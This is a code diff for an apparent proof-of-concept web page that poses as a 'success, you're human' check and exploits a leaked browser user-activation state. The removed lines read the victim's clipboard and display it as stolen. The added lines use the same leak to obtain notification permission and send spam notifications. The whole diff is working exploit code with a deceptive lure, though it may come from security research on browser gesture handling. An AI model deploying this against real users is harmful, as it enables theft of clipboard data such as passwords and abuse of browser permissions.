@@ -8,6 +8,8 @@
 
 <body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
     <h1>success, you're human</h1>
+    <p>Status: <b id="notif-status">Checking...</b></p>
+
     <script>
         if (window.opener) {
             setTimeout(() => {
@@ -19,21 +21,26 @@
 
         function checkAndExploit(triggerSource) {
             const isActive = navigator.userActivation.isActive;
+            const statusElement = document.getElementById('notif-status');
+
             console.log(`[${triggerSource}] Activation state:`, isActive);
 
             if (isActive && !triggered) {
                 triggered = true;
-                console.log("[!] Activation leak detected. Triggering Clipboard Read...");
-                navigator.clipboard.readText()
-                    .then((text) => {
-                        console.log("[!!!] CLIPBOARD STOLEN:", text);
-                        alert("EXPLOIT SUCCESS!\n\nUser Activation leaked.\nI can see your clipboard content:\n\n" + text);
-                        triggered = false;
-                    })
-                    .catch(e => {
-                        console.log("Clipboard API blocked/dismissed:", e.message);
-                        triggered = false;
-                    });
+                console.log("[!] Activation leak detected. Triggering Notification Request...");
+                Notification.requestPermission().then(permission => {
+                    console.log("Notification status:", permission);
+                    if (permission === "granted") {
+                        new Notification("EXPLOIT SUCCESS", {
+                            body: "User Activation leaked. I can now spam you with notifications!",
+                            icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
+                        });
+                    }
+                    triggered = false;
+                }).catch(e => {
+                    console.log("Notification blocked:", e.message);
+                    triggered = false;
+                });
             }
         }
 
